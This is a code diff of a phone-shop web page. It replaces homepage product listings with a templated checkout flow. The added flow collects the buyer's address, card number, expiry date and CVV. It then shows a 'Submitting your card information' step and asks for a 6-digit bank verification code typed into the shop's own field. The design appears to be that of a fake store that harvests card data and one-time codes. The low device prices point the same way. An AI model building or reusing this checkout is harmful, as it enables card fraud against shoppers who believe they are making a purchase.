-                        <i class="fas fa-shopping-bag"></i>
-                        Shop Now
-                    </a>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Benefits Section -->
-    <section class="benefits-section">
-        <div class="container">
-            <div class="benefits-grid">
-                <div class="benefit-card">
-                    <div class="benefit-icon">
-                        <i class="fas fa-shipping-fast"></i>
+         <div id="checkout-step-2" class="checkout-step">
+            <div class="customer-info-section">
+                <h3>${(currentLanguage === 'es' ? 'Información de Envío' : 'Shipping Information')}</h3>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>${(currentLanguage === 'es' ? 'Nombre Completo' : 'Full Name')} *</label>
+                        <input type="text" id="customer-name" required placeholder="${(currentLanguage === 'es' ? 'Ingrese su nombre completo' : 'Enter your full name')}" autocomplete="name">
                     </div>
-                    <div>
-                        <h3 data-translate="benefit_free_shipping">Free Shipping</h3>
-                        <p data-translate="benefit_free_shipping_desc">On all orders</p>
+
+                </div>
+                <div class="form-group">
+                    <label>${(currentLanguage === 'es' ? 'Teléfono' : 'Phone Number')} *</label>
+                    <input type="tel" id="customer-phone" required placeholder="${(currentLanguage === 'es' ? 'Número de teléfono' : 'Phone number')}" autocomplete="tel">
+                </div>
+                <div class="form-group">
+                    <label>${(currentLanguage === 'es' ? 'País' : 'Country')} *</label>
+                    <input type="text" id="customer-country" required value="${countryConfig[currentCountry].name}" readonly style="background: #f5f5f5;" autocomplete="country">
+                </div>
+                <div class="form-group">
+                    <label>${(currentLanguage === 'es' ? 'Dirección Completa' : 'Complete Address')} *</label>
+                    <textarea id="customer-address" required placeholder="${(currentLanguage === 'es' ? 'Dirección completa: Calle, número, ciudad, estado/provincia, código postal...' : 'Complete address: Street, number, city, state/province, postal code...')}" rows="4" class="responsive-textarea" autocomplete="street-address"></textarea>
+                    <div class="address-help">
+                        <i class="fas fa-info-circle"></i> 
+                        ${(currentLanguage === 'es' ? 'Incluya toda la información necesaria para la entrega' : 'Include all necessary information for delivery')}
+                    </div>
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>${(currentLanguage === 'es' ? 'Ciudad' : 'City')} *</label>
+                        <input type="text" id="customer-city" required placeholder="${(currentLanguage === 'es' ? 'Ciudad' : 'City')}" autocomplete="address-level2">
+                    </div>
+                    <div class="form-group">
+                        <label>${(currentLanguage === 'es' ? 'Código Postal' : 'Postal Code')}</label>
+                        <input type="text" id="customer-postal" placeholder="${(currentLanguage === 'es' ? 'Código postal' : 'Postal code')}" autocomplete="postal-code">
                     </div>
                 </div>
 
-                <div class="benefit-card">
-                    <div class="benefit-icon">
+                <div class="step-actions" style="margin-top: 2rem; display: flex; justify-content: space-between;">
+                    <button id="back-to-summary" class="btn btn-secondary">
+                        <i class="fas fa-arrow-left"></i> ${(currentLanguage === 'es' ? 'Volver' : 'Back')}
+                    </button>
+                    <button id="next-to-payment" class="btn btn-primary checkout-next">
+                        ${(currentLanguage === 'es' ? 'Continuar al Pago' : 'Continue to Payment')} <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div id="checkout-step-3" class="checkout-step">
+            <div class="payment-section">
+                <h3>${(currentLanguage === 'es' ? 'Método de Pago' : 'Payment Method')}</h3>
+                <div class="payment-methods">
+                    <label class="payment-option" data-method="bank-transfer">
+                        <input type="radio" name="payment-method" value="bank-transfer">
+                        <div class="payment-option-content">
+                            <i class="fas fa-university"></i>
+                            <span>${(currentLanguage === 'es' ? 'Transferencia Bancaria' : 'Bank Transfer')}</span>
+                        </div>
+                    </label>
+                    <label class="payment-option" data-method="credit-card">
+                        <input type="radio" name="payment-method" value="credit-card">
+                        <div class="payment-option-content">
+                            <i class="fas fa-credit-card"></i>
+                            <span>${(currentLanguage === 'es' ? 'Tarjeta de Crédito' : 'Credit Card')}</span>
+                        </div>
+                    </label>
+                </div>
+
+                <div id="payment-method-instruction" class="payment-instruction" style="text-align: center; padding: 2rem; color: var(--text-light); background: var(--background-light); border-radius: var(--border-radius); margin-top: 1rem;">
+                    <i class="fas fa-hand-pointer" style="font-size: 2rem; margin-bottom: 1rem; color: var(--primary-color);"></i>
+                    <p>${(currentLanguage === 'es' ? 'Por favor selecciona un método de pago para continuar' : 'Please select a payment method to continue')}</p>
+                    ${currentCountry !== 'nicaragua' ? `<p style="margin-top: 1rem; font-size: 0.9rem; color: var(--text-light);">${(currentLanguage === 'es' ? 'Nota: Transferencia bancaria solo está disponible en Nicaragua' : 'Note: Bank transfer is only available in Nicaragua')}</p>` : ''}
+                </div>
+
+                <div id="bank-transfer-details" class="payment-details" style="display: none;">
+                    <h4>${(currentLanguage === 'es' ? 'Datos Bancarios' : 'Bank Details')}</h4>
+                    <div class="bank-info">
+                        <p><strong>${(currentLanguage === 'es' ? 'Banco:' : 'Bank:')}</strong> ${getBankName()}</p>
+                        <p><strong>${(currentLanguage === 'es' ? 'Número de Cuenta:' : 'Account Number:')}</strong> ${getAccountNumber()}</p>
+                        <p><strong>${(currentLanguage === 'es' ? 'Titular de la Cuenta:' : 'Account Holder:')}</strong> ${getAccountHolder()}</p>
+
+                        <p><strong>${(currentLanguage === 'es' ? 'Referencia:' : 'Reference:')}</strong> ${checkoutData.orderNumber}</p>
+                        <p><strong>${(currentLanguage === 'es' ? 'Total a Transferir:' : 'Amount to Transfer:')}</strong> ${convertPrice(subtotal, false)}</p>
+                    </div>
+                    <p class="transfer-instructions">
+                        ${(currentLanguage === 'es' ? 'Realiza la transferencia por el monto total y confirma cuando hayas completado el pago.' : 'Make the transfer for the total amount and confirm when you have completed the payment.')}
+                    </p>
+                    <button class="btn btn-primary place-order" data-method="bank-transfer">${(currentLanguage === 'es' ? 'He realizado la transferencia' : 'I have made the transfer')}</button>
+                </div>
+
+            <div id="credit-card-details" class="payment-details" style="display: none;">
+                    <h4>${(currentLanguage === 'es' ? 'Detalles de la Tarjeta' : 'Card Details')}</h4>
+                    <p class="accepted-cards">
+                        <span>${(currentLanguage === 'es' ? 'Aceptado:' : 'Accepted:')}</span>
+                        <i class="fab fa-cc-visa"></i>
+                        <i class="fab fa-cc-mastercard"></i>
+                        <i class="fab fa-cc-amex"></i>
+                    </p>
+                    <form class="card-form">
+                        <div class="form-group">
+                            <label>${(currentLanguage === 'es' ? 'Nombre del Titular' : 'Cardholder Name')}</label>
+                            <input type="text" id="cardholder-name" required>
+                        </div>
+                        <div class="form-group">
+                            <label>${(currentLanguage === 'es' ? 'Número de Tarjeta' : 'Card Number')}</label>
+                            <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required maxlength="19">
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>${(currentLanguage === 'es' ? 'Fecha de Vencimiento' : 'Expiry Date')}</label>
+                                <input type="text" id="expiry-date" placeholder="MM/YY" required>
+                            </div>
+                            <div class="form-group">
+                                <label>CVV</label>
+                                <input type="text" id="cvv" placeholder="123" required maxlength="4">
+                            </div>
+                        </div>
+						<div id="card-errors" class="error-message" style="color: red; display: none;"></div>
+                    </form>
+                    <p class="security-notice">
+                        <i class="fas fa-lock"></i>
+                        <span>${(currentLanguage === 'es' ? 'Conexión SSL Segura - Tus datos están protegidos' : 'Secure SSL Connection - Your data is protected')}</span>
+                    </p>
+                    <button class="btn btn-primary place-order" data-method="credit-card">${(currentLanguage === 'es' ? 'Procesar Pago' : 'Process Payment')}</button>
+                </div>
+
+                <div class="step-actions" style="margin-top: 2rem; display: flex; justify-content: space-between;">
+                    <button id="back-to-shipping" class="btn btn-secondary">
+                        <i class="fas fa-arrow-left"></i> ${(currentLanguage === 'es' ? 'Volver' : 'Back')}
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div id="checkout-step-4" class="checkout-step">
+            <div class="processing-section">
+                <div class="loading-state" id="processing-card-submission">
+                    <div class="spinner"></div>
+                    <h3>${(currentLanguage === 'es' ? 'Enviando la información de su tarjeta' : 'Submitting your card information')}</h3>
+                    <p>${(currentLanguage === 'es' ? 'Por favor espere mientras enviamos la información de su tarjeta de crédito de forma segura.' : 'Please wait while we submit your credit card information securely.')}</p>
+                </div>
+            </div>
+        </div>
+
+        <div id="checkout-step-5" class="checkout-step">
+            <div class="confirmation-section">
+                <div class="loading-state" id="processing-payment">
+                    <div class="spinner"></div>
+                    <h3>${(currentLanguage === 'es' ? 'Procesando Pago' : 'Processing Payment')}</h3>
+                    <p>${(currentLanguage === 'es' ? 'Por favor espere mientras procesamos su pago. Esto puede tomar un minuto.' : 'Please hold on while we process your payment. This might take a minute.')}</p>
+                    <p class="processing-steps">
+                        <span class="step-text">${(currentLanguage === 'es' ? 'Validando método de pago' : 'Validating payment method')}</span>
+                    </p>
+                </div>
+                <div class="success-state" id="order-success" style="display: none;">
+                    <div class="success-icon">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <h3>${(currentLanguage === 'es' ? '¡Pedido Confirmado!' : 'Order Confirmed!')}</h3>
+                    <p>${(currentLanguage === 'es' ? 'Tu pedido ha sido procesado exitosamente.' : 'Your order has been processed successfully.')}</p>
+                    <div class="order-details">
+                        <div class="order-detail">
+                            <span>${(currentLanguage === 'es' ? 'Número de Pedido:' : 'Order Number:')}</span>
+                            <strong id="final-order-number">${checkoutData.orderNumber}</strong>
+                        </div>
+                        <div class="order-detail">
+                            <span>${(currentLanguage === 'es' ? 'Total:' : 'Total:')}</span>
+                            <strong>${convertPrice(subtotal, false)}</strong>
+                        </div>
+                        <div class="order-detail">
+                            <span>${(currentLanguage === 'es' ? 'Entrega Estimada:' : 'Estimated Delivery:')}</span>
+                            <strong>${getEstimatedDelivery()}</strong>
+                        </div>
+                    </div>
+                    <button class="btn btn-primary close-checkout-success">${(currentLanguage === 'es' ? 'Continuar Comprando' : 'Continue Shopping')}</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="checkout-step-6" class="checkout-step">
+            <div class="otp-section">
+                <div class="otp-header">
+                    <div class="otp-security">
                         <i class="fas fa-shield-alt"></i>
-                    </div>
-                    <div>
-                        <h3 data-translate="benefit_warranty">1 Year Warranty</h3>
-                        <p data-translate="benefit_warranty_desc">On all products</p>
+                        <span>${(currentLanguage === 'es' ? 'Verificación de Seguridad' : 'Security Verification')}</span>
                     </div>
                 </div>
-
-                <div class="benefit-card">
-                    <div class="benefit-icon">
-                        <i class="fas fa-undo-alt"></i>
+                <div class="otp-content">
+                    <h3>${(currentLanguage === 'es' ? 'Verificar tu Pago' : 'Verify Your Payment')}</h3>
+                    <p>${(currentLanguage === 'es' ? 'Hemos enviado un código de verificación de 6 dígitos a tu número de teléfono. Por favor, ingrésalo a continuación para completar tu compra.' : 'We have sent a 6-digit verification code to your phone number. Please enter it below to complete your purchase.')}</p>
+                    <div class="otp-input-container">
+                        <input type="tel" id="otp-single-input" class="otp-single-input" maxlength="6" inputmode="numeric" placeholder="123456" style="width: 200px; padding: 15px; font-size: 24px; text-align: center; border: 2px solid var(--border-color); border-radius: 8px; font-family: monospace; letter-spacing: 0.5em;" />
                     </div>
-                    <div>
-                        <h3 data-translate="benefit_return">30 Day Return</h3>
-                        <p data-translate="benefit_return_desc">Full refund guaranteed</p>
+                    <div class="otp-timer">
+                        <span>${(currentLanguage === 'es' ? 'El código expira en:' : 'Code expires in:')}</span> 
+                        <span id="otp-countdown">02:00</span>
                     </div>
-                </div>
-
-                <div class="benefit-card">
-                    <div class="benefit-icon">
-                        <i class="fas fa-gift"></i>
-                    </div>
-                    <div>
-                        <h3 data-translate="benefit_accessories">Premium Accessories Included</h3>
-                        <p data-translate="benefit_accessories_desc">Fast charging cable with power adapter, original packaging, and premium Gorilla Glass screen protector</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- WhatsApp Contact Section -->
-    <section class="whatsapp-contact-section">
-        <div class="container">
-            <div class="whatsapp-banner">
-                <div class="whatsapp-content">
-                    <div class="whatsapp-icon">
-                        <i class="fab fa-whatsapp"></i>
-                    </div>
-                    <div class="whatsapp-text">
-                        <h3 data-translate="whatsapp_title">Want to swap for a lower model or need more information?</h3>
-                        <p data-translate="whatsapp_subtitle">Chat with our experts on WhatsApp for personalized recommendations and instant support</p>
-                    </div>
-                    <a href="https://wa.me/18005558324?text=Hi%20TechZone!%20I%27m%20interested%20in%20your%20refurbished%20devices%20and%20would%20like%20more%20information." 
-                       class="whatsapp-btn" target="_blank" rel="noopener noreferrer">
-                        <i class="fab fa-whatsapp"></i>
-                        <span data-translate="whatsapp_button">Chat on WhatsApp</span>
-                    </a>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Products Section -->
-    <section id="products" class="products-section">
-        <div class="container">
-            <div class="section-header">
-                    <h2 data-translate="featured_products">Productos Destacados</h2>
-                    <div class="filters-container" style="display: flex; flex-direction: column; gap: 1rem; width: 100%;">
-                        <!-- Line 1: All, iPhone, Samsung -->
-                        <div class="filter-line-1" style="display: flex; gap: 0.5rem; justify-content: center; flex-wrap: wrap;">
-                            <button class="filter-btn active" data-filter="all" data-translate="all">Todos</button>
-                            <button class="filter-btn" data-filter="iphone" data-translate="iphones">iPhone</button>
-                            <button class="filter-btn" data-filter="samsung" data-translate="samsung">Samsung</button>
-                        </div>
-
-                        <!-- Line 2: Audio, Accessories -->
-                        <div class="filter-line-2" style="display: flex; gap: 0.5rem; justify-content: center; flex-wrap: wrap;">
-                            <button class="filter-btn" data-filter="audio" data-translate="audio">Audio</button>
-                            <button class="filter-btn" data-filter="accessory" data-translate="accessories">Accesorios</button>
-                        </div>
-
-                        <!-- Line 3: Price sorting buttons -->
-                        <div class="filter-line-3" style="display: flex; gap: 0.5rem; justify-content: center; flex-wrap: wrap;">
-                            <button class="sort-btn" data-sort="price-low" style="padding: 0.4rem 0.8rem; border-radius: 25px; border: 2px solid var(--border-color); background: white; font-weight: 600; cursor: pointer; transition: var(--transition); font-size: 0.75rem; white-space: nowrap;">
-                                <i class="fas fa-sort-amount-up"></i> <span data-translate="price_low_to_high">Cheapest First</span>
-                            </button>
-                            <button class="sort-btn" data-sort="price-high" style="padding: 0.4rem 0.8rem; border-radius: 25px; border: 2px solid var(--border-color); background: white; font-weight: 600; cursor: pointer; transition: var(--transition); font-size: 0.75rem; white-space: nowrap;">
-                                <i class="fas fa-sort-amount-down"></i> <span data-translate="price_high_to_low">Most Expensive First</span>
-                            </button>
-                        </div>
-                    </div>
-                </div>
-
-            <div class="products-grid">
-                <!-- iPhone 16 Pro Max -->
-<div class="product-card" data-category="iphones" data-product-id="iphone16promax">
-    <div class="product-badge" data-translate="new">New!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=iphone16promax'">
-        <img id="iphone16promax-main-image" 
-             src="https://m.media-amazon.com/images/I/61UMlmDXG+L._AC_SX466_.jpg" 
-             alt="" loading="eager" decoding="async" fetchpriority="high">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name">
-            <a href="product.html?id=iphone16promax" data-translate="iphone16promax_name"></a>
-        </h3>
-        <p class="product-desc" data-translate="iphone_desc"></p>
-
-        <div class="product-price">
-            <span class="current-price">Starting from $769</span>
-        </div>
-        <div class="product-actions">
-            <a href="product.html?id=iphone16promax" class="btn btn-primary choose-type-btn">
-                <i class="fas fa-mobile-alt"></i>
-                <span data-translate="choose_type">Choose Type</span>
-            </a>
-        </div>
-    </div>
-</div>
-<!-- iPhone 16 -->
-<div class="product-card" data-category="iphones" data-product-id="iphone16">
-    <div class="product-badge" data-translate="new">New!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=iphone16'">
-        <img src="https://m.media-amazon.com/images/I/71QkWOSDkmL._AC_SX569_.jpg" alt="" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name">
-            <a href="product.html?id=iphone16" data-translate="iphone16_name"></a>
-        </h3>
-        <p class="product-desc" data-translate="iphone_desc"></p>
-        <div class="product-price">
-            <span class="current-price">Starting from $659</span>
-        </div>
-        <div class="product-actions">
-            <a href="product.html?id=iphone16" class="btn btn-primary choose-type-btn">
-                <i class="fas fa-mobile-alt"></i>
-                <span data-translate="choose_type">Choose Type</span>
-            </a>
-        </div>
-    </div>
-</div>
-<!-- iPhone 15 Pro Max -->
-<div class="product-card" data-category="iphones" data-product-id="iphone15promax">
-    <div class="product-badge" data-translate="certified">Certified!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=iphone15promax'">
-        <img id="iphone15-main-image" src="https://m.media-amazon.com/images/I/61v5Jay9F5L._AC_SX569_.jpg" alt="iPhone 15 Pro Max" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name">
-            <a href="product.html?id=iphone15promax">iPhone 15 Pro Max</a>
-        </h3>
-        <p class="product-desc" data-translate="iphone_desc"></p>
-        <div class="product-price">
-            <span class="current-price">Starting from $629</span>
-        </div>
-        <a href="product.html?id=iphone15promax" class="btn btn-primary choose-type-btn">
-            <i class="fas fa-mobile-alt"></i>
-            <span data-translate="choose_type">Choose Type</span>
-        </a>
-    </div>
-</div>
-<!-- iPhone 16 e -->
-<div class="product-card" data-category="iphones" data-product-id="iphone16e">
-    <div class="product-badge" data-translate="new">New!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=iphone16e'">
-        <img src="https://m.media-amazon.com/images/I/61Zsers1VBL._AC_SX425_.jpg" alt="iPhone 16 e" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=iphone16e">iPhone 16 e</a></h3>
-        <p class="product-desc" data-translate="iphone_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $539</span></div>
-        <a href="product.html?id=iphone16e" class="btn btn-primary choose-type-btn"><i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span></a>
-    </div>
-</div>
-<!-- iPhone 15 -->
-<div class="product-card" data-category="iphones" data-product-id="iphone15">
-    <div class="product-badge" data-translate="certified">Certified!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=iphone15'">
-        <img src="https://m.media-amazon.com/images/I/51PtFHUPjBL._AC_SY606_.jpg" alt="iPhone 15" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=iphone15">iPhone 15</a></h3>
-        <p class="product-desc" data-translate="iphone_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $519</span></div>
-        <a href="product.html?id=iphone15" class="btn btn-primary choose-type-btn"><i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span></a>
-    </div>
-</div>
-<!-- iPhone 14 Pro Max -->
-<div class="product-card" data-category="iphones" data-product-id="iphone14promax">
-    <div class="product-badge" data-translate="hot">Hot!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=iphone14promax'">
-        <img id="iphone14-main-image" src="https://m.media-amazon.com/images/I/51wqFSpP20L._AC_SL1000_.jpg" alt="iPhone 14 Pro Max" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name">
-            <a href="product.html?id=iphone14promax">iPhone 14 Pro Max</a>
-        </h3>
-        <p class="product-desc" data-translate="iphone_desc"></p>
-        <div class="product-price">
-            <span class="current-price">Starting from $429</span>
-        </div>
-        <div class="product-actions">
-            <a href="product.html?id=iphone14promax" class="btn btn-primary choose-type-btn">
-                <i class="fas fa-mobile-alt"></i>
-                <span data-translate="choose_type">Choose Type</span>
-            </a>
-        </div>
-    </div>
-</div>
-<!-- iPhone 14 -->
-<div class="product-card" data-category="iphones" data-product-id="iphone14">
-    <div class="product-badge" data-translate="newarrival">New Arrival</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=iphone14'">
-        <img id="iphone14-main-image" src="https://m.media-amazon.com/images/I/51Yz9FaNIGL._AC_SL1000_.jpg" alt="iPhone 14" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name">
-            <a href="product.html?id=iphone14">iPhone 14</a>
-        </h3>
-        <p class="product-desc" data-translate="iphone_desc"></p>
-        <div class="product-price">
-            <span class="current-price">Starting from $379</span>
-        </div>
-        <div class="product-actions">
-            <a href="product.html?id=iphone14" class="btn btn-primary choose-type-btn">
-                <i class="fas fa-mobile-alt"></i>
-                <span data-translate="choose_type">Choose Type</span>
-            </a>
-        </div>
-    </div>
-</div>
-<!-- iPhone 13 Pro Max -->
-<div class="product-card" data-category="iphones" data-product-id="iphone13promax">
-    <div class="product-badge" data-translate="bestseller">Best Seller!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=iphone13promax'">
-        <img id="iphone13-main-image" src="https://m.media-amazon.com/images/I/51UuPZLMaCL._AC_SX569_.jpg" alt="iPhone 13 Pro Max" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name">
-            <a href="product.html?id=iphone13promax">iPhone 13 Pro Max</a>
-        </h3>
-        <p class="product-desc" data-translate="iphone_desc"></p>
-        <div class="product-price">
-            <span class="current-price">Starting from $359</span>
-        </div>
-        <div class="product-actions">
-            <a href="product.html?id=iphone13promax" class="btn btn-primary choose-type-btn">
-                <i class="fas fa-mobile-alt"></i>
-                <span data-translate="choose_type">Choose Type</span>
-            </a>
-        </div>
-    </div>
-</div>
-<!-- iPhone 12 Pro Max -->
-<div class="product-card" data-category="iphones" data-product-id="iphone12promax">
-    <div class="product-badge" data-translate="deal">Deal!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=iphone12promax'">
-        <img id="iphone12-main-image" src="https://m.media-amazon.com/images/I/5109dvnof9L._AC_SY606_.jpg" alt="iPhone 12 Pro Max" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name">
-            <a href="product.html?id=iphone12promax">iPhone 12 Pro Max</a>
-        </h3>
-        <p class="product-desc" data-translate="iphone_desc"></p>
-        <div class="product-price">
-            <span class="current-price">Starting from $219</span>
-        </div>
-        <div class="product-actions">
-            <a href="product.html?id=iphone12promax" class="btn btn-primary choose-type-btn">
-                <i class="fas fa-mobile-alt"></i>
-                <span data-translate="choose_type">Choose Type</span>
-            </a>
-        </div>
-    </div>
-</div>
-<!-- iPhone 11 Pro Max -->
-<div class="product-card" data-category="iphones" data-product-id="iphone11promax">
-    <div class="product-badge" data-translate="value">Great Value!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=iphone11promax'">
-        <img id="iphone11-main-image" src="https://m.media-amazon.com/images/I/61UC1mk6dfL.__AC_SX300_SY300_QL70_FMwebp_.jpg" alt="iPhone 11 Pro Max" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name">
-            <a href="product.html?id=iphone11promax">iPhone 11 Pro Max</a>
-        </h3>
-        <p class="product-desc" data-translate="iphone_desc"></p>
-        <div class="product-price">
-            <span class="current-price">Starting from $149</span>
-        </div>
-        <div class="product-actions">
-            <a href="product.html?id=iphone11promax" class="btn btn-primary choose-type-btn">
-                <i class="fas fa-mobile-alt"></i>
-                <span data-translate="choose_type">Choose Type</span>
-            </a>
-        </div>
-    </div>
-</div>
-<!-- iPhone XR -->
-<div class="product-card" data-category="iphones" data-product-id="iphonexr">
-    <div class="product-badge" data-translate="value">Great Value!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=iphonexr'">
-        <img id="iphonexr-main-image" src="https://m.media-amazon.com/images/I/61FAlH3md+L._AC_SX569_.jpg" alt="iPhone XR" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name">
-            <a href="product.html?id=iphonexr">iPhone XR</a>
-        </h3>
-        <p class="product-desc" data-translate="iphone_desc"></p>
-        <div class="product-price">
-            <span class="current-price">Starting from $129</span>
-        </div>
-        <div class="product-actions">
-            <a href="product.html?id=iphonexr" class="btn btn-primary choose-type-btn">
-                <i class="fas fa-mobile-alt"></i>
-                <span data-translate="choose_type">Choose Type</span>
-            </a>
-        </div>
-    </div>
-</div>
-<!-- Samsung Galaxy S25 Ultra -->
-<div class="product-card" data-category="samsung" data-product-id="galaxys25ultra">
-    <div class="product-badge" data-translate="new">New!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=galaxys25ultra'">
-        <img src="https://m.media-amazon.com/images/I/61n0lmxP5-L._AC_SX569_.jpg" alt="Samsung Galaxy S25 Ultra" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=galaxys25ultra">Samsung Galaxy S25 Ultra</a></h3>
-        <p class="product-desc" data-translate="samsung_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $719</span></div>
-        <a href="product.html?id=galaxys25ultra" class="btn btn-primary choose-type-btn">
-            <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-        </a>
-    </div>
-</div>
-<!-- Samsung Galaxy S25 -->
-<div class="product-card" data-category="samsung" data-product-id="galaxyS25">
-    <div class="product-badge" data-translate="new">New!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=galaxyS25'">
-        <img src="https://m.media-amazon.com/images/I/71V--WZVUIL._AC_SX569_.jpg" alt="Samsung Galaxy S25" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name">
-            <a href="product.html?id=galaxyS25">Samsung Galaxy S25</a>
-        </h3>
-        <p class="product-desc" data-translate="samsung_desc"></p>
-        <div class="product-price">
-            <span class="current-price">Starting from $599</span>
-        </div>
-        <a href="product.html?id=galaxyS25" class="btn btn-primary choose-type-btn">
-            <i class="fas fa-mobile-alt"></i>
-            <span data-translate="choose_type">Choose Type</span>
-        </a>
-    </div>
-</div>
-<!-- Samsung Galaxy S24 Ultra -->
-<div class="product-card" data-category="samsung" data-product-id="galaxys24ultra">
-    <div class="product-badge" data-translate="premium">Premium!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=galaxys24ultra'">
-        <img src="https://m.media-amazon.com/images/I/51E3rux4DgL.__AC_SX300_SY300_QL70_FMwebp_.jpg" alt="Samsung Galaxy S24 Ultra" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=galaxys24ultra">Samsung Galaxy S24 Ultra</a></h3>
-        <p class="product-desc" data-translate="samsung_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $599</span></div>
-        <a href="product.html?id=galaxys24ultra" class="btn btn-primary choose-type-btn">
-            <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-        </a>
-    </div>
-</div>
-<!-- Samsung Galaxy S24 Plus -->
-<div class="product-card" data-category="samsung" data-product-id="galaxys24plus">
-    <div class="product-badge" data-translate="new">New!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=galaxys24plus'">
-        <img src="https://m.media-amazon.com/images/I/51bdK6FaR-L._AC_SX569_.jpg" alt="Samsung Galaxy S24 Plus" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=galaxys24plus">Samsung Galaxy S24 Plus</a></h3>
-        <p class="product-desc" data-translate="samsung_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $559</span></div>
-        <a href="product.html?id=galaxys24plus" class="btn btn-primary choose-type-btn">
-            <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-        </a>
-    </div>
-</div>
-<!-- Samsung Galaxy S24 -->
-<div class="product-card" data-category="samsung" data-product-id="galaxys24">
-    <div class="product-badge" data-translate="premium">Premium!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=galaxys24'">
-        <img src="https://m.media-amazon.com/images/I/61uakkLoHxL._AC_SX569_.jpg" alt="Samsung Galaxy S24" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=galaxys24">Samsung Galaxy S24</a></h3>
-        <p class="product-desc" data-translate="samsung_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $529</span></div>
-        <a href="product.html?id=galaxys24" class="btn btn-primary choose-type-btn">
-            <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-        </a>
-    </div>
-</div>
-<!-- Samsung Galaxy A54 5G -->
-<div class="product-card" data-category="samsung" data-product-id="galaxya745g">
-    <div class="product-badge" data-translate="new">New!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=galaxya745g'">
-        <img src="https://m.media-amazon.com/images/I/51orKJJMfTL.__AC_SX300_SY300_QL70_FMwebp_.jpg" alt="Samsung Galaxy A54 5G" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=galaxya745g">Samsung Galaxy A54 5G</a></h3>
-        <p class="product-desc" data-translate="samsung_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $349</span></div>
-        <a href="product.html?id=galaxya745g" class="btn btn-primary choose-type-btn">
-            <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-        </a>
-    </div>
-</div>
-<!-- Samsung Galaxy S23 Ultra -->
-<div class="product-card" data-category="samsung" data-product-id="galaxys23ultra">
-    <div class="product-badge" data-translate="top_rated">Top Rated!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=galaxys23ultra'">
-        <img src="https://m.media-amazon.com/images/I/513vXUcPFrL._AC_SX569_.jpg" alt="Samsung Galaxy S23 Ultra" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=galaxys23ultra">Samsung Galaxy S23 Ultra</a></h3>
-        <p class="product-desc" data-translate="samsung_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $329</span></div>
-        <a href="product.html?id=galaxys23ultra" class="btn btn-primary choose-type-btn">
-            <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-        </a>
-    </div>
-</div>
-<!-- Samsung Galaxy S23 -->
-<div class="product-card" data-category="samsung" data-product-id="galaxys23">
